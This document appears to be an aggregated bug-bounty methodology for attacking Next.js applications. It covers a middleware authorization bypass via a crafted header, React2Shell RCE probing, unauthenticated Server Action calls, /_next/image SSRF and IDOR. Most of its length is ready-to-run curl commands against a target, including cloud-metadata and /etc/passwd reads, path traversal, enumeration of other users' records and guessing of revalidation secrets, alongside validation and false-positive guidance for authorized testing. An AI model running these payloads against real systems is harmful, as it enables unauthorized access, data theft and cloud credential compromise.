# Unified upstream methodology

Collected from every contributing repository skill. Deduplicated by content hash; full originals are preserved in `references/upstream-*.md`.

## Discovery and hunting method

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs to look for

- **CVE-2025-29927 — middleware authorization bypass (CVSS 9.1, GHSA-f82v-jwr5-mffw).** Affects self-hosted/Node-server Next.js **11.1.4 → 13.5.6**, **14.x < 14.2.25**, **15.x < 15.2.3** (also 12.3.5/13.5.9 fix lines). A single header skips middleware entirely: `X-Middleware-Subrequest`. **Vercel-hosted apps are automatically protected** — this is a self-hosted finding. Fingerprint middleware-protected routes by the response headers `x-middleware-rewrite`, `x-middleware-next`, `x-middleware-redirect` (often on a non-200 redirect to `/login` or `/unauthorized`).
- **Exact header values by version (from zhero's research / ProjectDiscovery):**
  - `< 12.2`: `x-middleware-subrequest: pages/_middleware` (nested: `pages/dashboard/_middleware`).
  - `12.2–13.1`: `x-middleware-subrequest: middleware` (or `src/middleware` for a `/src` layout).
  - `>= 13.2.0`: repeat to satisfy the recursion-depth check — `middleware:middleware:middleware:middleware:middleware` (or `src/middleware:...` ×5).
  The check occurs *before* the recursion-depth enforcement, so the repeated form works on patched-for-loop builds too.
- **CVE-2025-55182 "React2Shell" (CVSS 10.0) + CVE-2025-66478 (Next.js, rejected as duplicate).** Pre-auth RCE via insecure deserialization of the **RSC "Flight" protocol** in `react-server`. Default `create-next-app` production builds are vulnerable with no developer code changes. Affected: `react-server-dom-*` **19.0.x / 19.1.x / 19.2.x** (fixed **19.0.1 / 19.1.2 / 19.2.1**); **Next.js App Router** 14.3.0-canary.77+, 15.x, 16.x (fixed **15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7**, and 14.x stable). Other RSC bundlers: Vite/Parcel RSC plugins, React Router RSC preview, RedwoodSDK, Waku. Wiz measured ~**39% of cloud environments** with a vulnerable instance.
- **React2Shell in-the-wild IoCs** (exploitation began 2025-12-05): shells harvesting env vars/files/**instance metadata** (AWS keys Base64-encoded for exfil), Sliver implant installs, XMRig cryptominers (UPX-packed and GitHub-downloaded variants), OAST DNS to `*.oast.live` / `*.oastify.com`, anomalous DNS from Next.js containers, and child processes spawned by the Next.js server. GreyNoise saw 95 IPs doing automated exploitation from 04:00 UTC 2025-12-05.
- **CVE-2024-34351 (GHSA-fr5h-rqp8-mj6g)** — Server Actions SSRF via a relative redirect trusting the `Host` header (13.4.0 → < 14.1.1, fixed 14.1.1). Not a `/_next/image` bug; does not affect Host-routed Vercel deployments.
- **Baseline version fingerprints remain essential:** `"buildId"` in HTML, `x-nextjs-*` headers, `/_next/static/chunks/framework-*.js` for the embedded `next` version, `/_next/image?url=...`, `/_next/data/<BUILD_ID>/*.json`, `__NEXT_DATA__`, `.js.map` exposure.
- **App Router vs Pages Router matters.** CVE-2025-55182 affects App Router / RSC; a pure Pages Router app with no `react-server` bundle is not reachable through the Flight protocol. Distinguish by the presence of `react-server-dom-webpack`/`-turbopack` chunks and `Next-Action` headers.
- **Server Action identifier discovery:** extract 40-hex action IDs from the RSC payload / JS chunks (`createActionURL`, `$$ACTION_`, `Next-Action:`). The middleware bypass header can be combined with a direct `POST` carrying the action ID and an empty Cookie header to test for client-side-only enforcement.
- **CSP-bypass angle:** if middleware is what injects `Content-Security-Policy`, CVE-2025-29927 also removes CSP. Re-test any known reflected-XSS sink with the bypass header — CSP loss converts an otherwise unexploitable reflection into a live XSS (cross-reference `xss`).
- **Cache-poisoning angle:** if middleware sets cache-control headers on protected routes, the bypass can cause privileged content to be cached and served to unauthenticated users. Confirm with a second clean client and `x-nextjs-cache` / `age` headers before calling it poisoning rather than plain reflection.

## Signals and surfaces

### Crown Jewel Targets

Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.

**Highest-value chains:**
- **Server Actions auth bypass** — Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
- **Middleware bypass via `/_next/static/`** — middleware skips static asset paths → protected routes accessible via `/_next/data/` IDOR
- **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
- **ISR stale cache poisoning** — inject malicious content into a cached page that gets served to all users
- **RSC payload leakage** — React Server Component flight data contains server-side props not meant for client

---

### Attack Surface Signals

```
/_next/image?url=&w=&q=          Image optimizer — SSRF candidate
/_next/data/BUILD_ID/*.json      Prerendered page data — IDOR candidate
/__nextjs_original-stack-frame   Debug stack frame endpoint
/_next/static/chunks/            JS bundles — source map candidate
/api/                            API routes — standard hunt surface
__NEXT_DATA__ in HTML            SSR props leaked to client
x-nextjs-* response headers      Confirms Next.js
```

---

## Techniques, payloads and bypasses

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Middleware bypass differential (concrete, low-noise):**
```
GET /dashboard/admin                                  -> 307 to /login + x-middleware-rewrite
GET /dashboard/admin
  X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
                                                      -> 200 + protected body  = CONFIRMED
```
  Try the `src/middleware:...` ×5 variant for `/src` layouts. Enumerate endpoints from `href="/..."` links in the base HTML; the ProjectDiscovery template tests each extracted path and requires a middleware header on the first response plus status 200 on the second.
- **Chain to impact:** the bypass only removes the middleware gate — follow through to the exposed admin panel, `/api/*` route, file-management handler, or Server Action. WAF/lb workaround to test the boundary: strip or blank `x-middleware-subrequest` at the edge (`proxy_set_header x-middleware-subrequest "";` in nginx, `RequestHeader unset` in Apache), then confirm the bypass disappears.
- **React2Shell probe concept:** the flaw is a logical deserialization bug in how the server parses RSC payloads, triggered by a crafted request with `Next-Action` / RSC-style form data. Because public exploits exist and reliability is near-100% on default configs, use a **non-destructive marker** (a uniquely named temp file or a single OOB callback) rather than dropping a shell. Patch verification: `npx fix-react2shell-next`, then confirm the bundled `react-server-dom-*` version is one of the hardened releases.
- **`/ _next/image` SSRF revisit:** only claim SSRF via a unique Collaborator subdomain; a 400 is the normal `remotePatterns`/`images.domains` allowlist rejection, and a 200 returns an optimized image, not the upstream body. Host-header-dependent Server Actions SSRF (CVE-2024-34351) is the separate 13.4/14.0 path.
- **Server Actions auth bypass (baseline Phase 2)** becomes far more valuable with the middleware bypass: call the action ID directly with `Next-Action: <id>` and an empty/invalid session; if it mutates state, you have an unauthenticated privileged mutation even without CVE-2025-29927.

### Phase 3 — Middleware Auth Bypass

```bash
# Next.js middleware runs on edge runtime and may skip certain paths
# Test protected route directly
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
# → 200 means accessible

# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"

# Test via static asset path prefix (middleware matcher may exclude /_next/static)
curl -s "https://$TARGET/_next/static/../admin/dashboard"

# Encoded path bypass
curl -s "https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json"
curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
```

---

### Middleware bypass via `x-middleware-subrequest` (CVE-2025-29927)

Next skips middleware execution entirely when this header asserts an internal subrequest — bypassing auth/redirect middleware on gated routes.
```bash
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
# also: -H "x-middleware-subrequest: src/middleware"  and  "pages/_middleware"
# 200 on a middleware-gated route = bypassed. Fixed 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3.
```

## Validation and proof

### Validation

✅ Server Action: action executes without valid session, returns data or mutates state
✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
✅ Middleware bypass: 200 response on protected route without auth cookie
✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII

**Severity:**
- Server Action auth bypass → data mutation: High/Critical
- Image SSRF → cloud metadata: Critical
- Middleware bypass → admin panel: High
- Source map exposure only: Low-Medium

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **CVE-2025-29927:** a 200 with the header is necessary, but also show that the *same* request without it is redirected/blocked and that the 200 body contains genuinely protected content (not just a static shell). A 200 on a public page is meaningless. A vulnerable *version* alone is not an exploitable finding — require the header differential.
- **Vercel exclusion:** if the app is demonstrably Vercel-hosted (`x-vercel-*`, `*.vercel.app`, Vercel-signed deployment headers), middleware bypass is automatically mitigated — do not report it. Self-hosted Node server, Docker, or a custom `next start` behind your own proxy is the affected deployment.
- **React2Shell:** prove execution with a unique OOB callback or a verifiable file/command artifact, and confirm the version matrix from the actual bundle (`react-server-dom-webpack` / `-turbopack` / `-parcel` in the source map or `node_modules`), not from a banner. A bare 500 from a malformed RSC payload is a crash, not RCE.
- **Post-exploitation context raises severity but is not your PoC:** if you observe XMRig, Sliver, AWS metadata access, or OAST DNS on a target during testing, report it as possible pre-existing compromise (per `mid-engagement-ir-detection`) — it is not evidence that *your* request achieved RCE.
- **Patch-check both layers:** React and Next.js ship independently; a fixed Next.js version with an unfixed bundled `react-server` (or a monorepo with multiple React copies) can still be vulnerable. Check all `react-server-dom-*` copies in the SBOM/lockfile.
- **Redact** session cookies, `NEXT_PUBLIC_*` secrets, and any other-user PII in captured RSC/`__NEXT_DATA__` payloads; keep only the differential status/headers and a labeled marker in evidence.
- **Reproduction note for triagers:** include the exact two requests (with and without `X-Middleware-Subrequest`), the protected path, the middleware response headers, and the differing bodies. The whole CVE-2025-29927 test is two curl calls; anything more elaborate invites a false negative.
- **Dev-mode endpoints are still separate:** `__nextjs_original-stack-frame` / `__nextjs_launch-editor` are react-dev-overlay routes present only under `next dev`; a 404 is normal production behavior, not a bypass target. Keep that false-positive guard from the baseline while testing the 2026 CVEs.

### Validation

✅ Server Action: action executes without valid session, returns data or mutates state
✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
✅ Middleware bypass: 200 response on protected route without auth cookie
✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII

**Severity:**
- Server Action auth bypass → data mutation: High/Critical
- Image SSRF → cloud metadata: Critical
- Middleware bypass → admin panel: High
- Source map exposure only: Low-Medium

## Escalation and related chains

### Chain Table

| Next.js finding | Chain to | Impact |
|----------------|----------|--------|
| Server Action no auth | Call privileged mutations directly | Data manipulation / admin access |
| `/_next/image` SSRF | Cloud metadata → IAM creds | Cloud compromise |
| `/_next/data/` IDOR | Other users' server-side props | PII / token exfil |
| Middleware bypass | Protected admin routes | Auth bypass |
| Source map exposed | Reconstruct TS source → find hardcoded secrets | Further vulns |
| `__NEXT_DATA__` leaks | Server-side secrets in HTML | API keys / tokens |

---

## Sources and related reading

### D. Sources — numbered list of URLs you actually fetched

1. https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass
2. https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182
3. https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
4. https://nvd.nist.gov/vuln/detail/CVE-2025-29927
5. https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
6. https://nextjs.org/blog/CVE-2025-66478
7. https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
8. https://www.ncsc.gov.uk/news/vulnerability-affecting-nextjs-web-development-framework
9. https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/
10. https://greynoise.io/blog/cve-2025-55182-react2shell-opportunistic-exploitation-in-the-wild-what-the-greynoise-observation-grid-is-seeing-so-far

## Additional notes

### Phase 1 — Fingerprint & Version Detection

```bash
# Confirm Next.js and get build ID
curl -s https://$TARGET/ | grep -oP '"buildId":"[^"]+"'
curl -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"

# Extract build ID for /_next/data/ paths
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Check Next.js version via package disclosure
curl -s https://$TARGET/_next/static/chunks/framework*.js | grep -oP '"next":"[^"]+"'

# Source map exposure
curl -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
```

---

### Phase 2 — Server Actions Abuse

```bash
# Server Actions in Next.js 14+ use x-action-id or Next-Action header
# Find action IDs in HTML source or JS bundles
curl -s https://$TARGET/ | grep -oP '"action":"[a-f0-9]+"'
grep -r "createActionURL\|$$ACTION_" recon/$TARGET/ --include="*.js" 2>/dev/null

# Call Server Action directly without auth
curl -s -X POST https://$TARGET/target-page \
  -H "Next-Action: ACTION_ID_HERE" \
  -H "Content-Type: multipart/form-data; boundary=----" \
  -H "Cookie: " \
  --data-raw $'------\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------\r\n'

# Test: does the action execute without a valid session?
# If it returns data or mutates state → auth enforcement is client-side only
```

---

### Phase 4 — Image Optimization SSRF (`/_next/image`)

```bash
# Basic SSRF test — internal metadata
curl -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"

# Protocol bypass attempts
curl -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
curl -s "https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75"

# OOB detection — use a UNIQUE per-test subdomain so callbacks can't be confused
COLLAB="http://UNIQUE.COLLAB_HOST"
curl -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"
# Check Interactsh/Burp Collaborator for DNS/HTTP callback on that exact subdomain
```

**FALSE-POSITIVE GUARD (read before claiming SSRF):** `/_next/image` only
fetches URLs allowed by `images.remotePatterns` / `images.domains` in
`next.config.js`. A non-whitelisted `url` returns **400 by default** — that is
the optimizer's normal allowlist rejection, NOT a "block" you bypassed. A **200**
returns an *optimized image*, not the upstream response body, so a status code
alone NEVER confirms SSRF. Confirm only via an **out-of-band callback to a unique
Collaborator subdomain** (above), or by body-diffing a known-internal vs
known-external target. Do not report on status code.

> Note: CVE-2024-34351 (Next.js SSRF, GHSA-fr5h-rqp8-mj6g, affects 13.4.0
> through < 14.1.1, fixed in 14.1.1) is a **Server Actions** SSRF — a relative
> redirect that trusts the `Host` header — NOT a `/_next/image` bug, and it does
> NOT affect Host-routed providers like Vercel. See Phase 2 for the Server
> Actions surface.

---

### Phase 5 — `/_next/data/` IDOR & Data Leakage

```bash
# Enumerate prerendered JSON for user-specific data
# Pattern: /_next/data/BUILD_ID/[page].json or /_next/data/BUILD_ID/[dynamic]/[id].json
curl -s "https://$TARGET/_next/data/$BUILD_ID/profile.json" \
  -H "Cookie: session=VICTIM_SESSION"

# Try other users' data
for ID in 1 2 3 100 1000; do
  curl -s "https://$TARGET/_next/data/$BUILD_ID/users/$ID.json" | head -3
done

# Check __NEXT_DATA__ in HTML for sensitive server-side props
curl -s "https://$TARGET/dashboard" | \
  python3 -c "import sys,re,json; m=re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.*?)</script>',sys.stdin.read(),re.S); print(json.dumps(json.loads(m.group(1)),indent=2) if m else 'not found')"
```

---

### Phase 6 — ISR Cache Poisoning

```bash
# ISR pages regenerate on request after revalidation period
# If user input influences the static page content without sanitization:
# 1. Trigger revalidation with malicious input in URL/query
# 2. Injected content cached and served to all users

# Test: does query param affect cached page content?
# Use a UNIQUE marker (not a generic <script>) so a match proves YOUR input landed,
# and confirm the response was actually CACHED + served to a DIFFERENT client.
MARK="zqx$(date +%s)"
# 1) Poison with the marker
curl -s "https://$TARGET/blog/test-post?preview=<b>$MARK</b>" -o /dev/null
# 2) Re-fetch the CLEAN url (no query) from a fresh client and grep the marker.
#    Body-diff clean-vs-poisoned and check x-nextjs-cache / age headers — a reflected
#    marker WITHOUT proof it persists in the cache key is just reflection, not poisoning.
curl -si "https://$TARGET/blog/test-post" | grep -iE "$MARK|x-nextjs-cache|age:"

# On-demand revalidation endpoint (if exposed)
curl -s "https://$TARGET/api/revalidate?secret=GUESS&path=/blog/test"
curl -s "https://$TARGET/api/revalidate?token=GUESS&path=/admin"
```

---

### Phase 7 — Debug & Stack Frame Endpoints

**Precondition:** `__nextjs_launch-editor` and `__nextjs_original-stack-frame`
are react-dev-overlay middleware mounted ONLY under `next dev`. A production
build (`next build && next start`) does not register these routes — a 404 here
is the normal, expected result, not a "filter" you need to bypass. They are
reachable ONLY in the rare misconfiguration of literally running `next dev` in
production. Treat any non-404 as the real finding; do NOT report a 404/filtered
response as confirmation.

```bash
# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)
curl -s -o /dev/null -w "%{http_code}" \
  "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"

# Only if the above is NOT 404: the launch-editor / stack-frame endpoints can
# reference local files (file-read surface of a dev server wrongly exposed)
curl -s "https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1"
curl -s "https://$TARGET/__nextjs_original-stack-frame" \
  --data '{"file":"/etc/passwd","line":1,"column":1}'
```

---

### Phase 8 — Environment Variable Leakage

```bash
# NEXT_PUBLIC_* vars are baked into JS bundles — grep for secrets
curl -s "https://$TARGET/_next/static/chunks/pages/_app.js" | \
  grep -oE "NEXT_PUBLIC_[A-Z_]+['\"]?\s*[:=]\s*['\"]?[^'\"&\s]+"

# Check for non-public vars accidentally exposed
curl -s https://$TARGET/ | python3 -c "
import sys, re, json
m = re.search(r'__NEXT_DATA__.*?({.*?})</script>', sys.stdin.read(), re.S)
if m:
    d = json.loads(m.group(1))
    print(json.dumps(d.get('props', {}), indent=2))
"
```

---
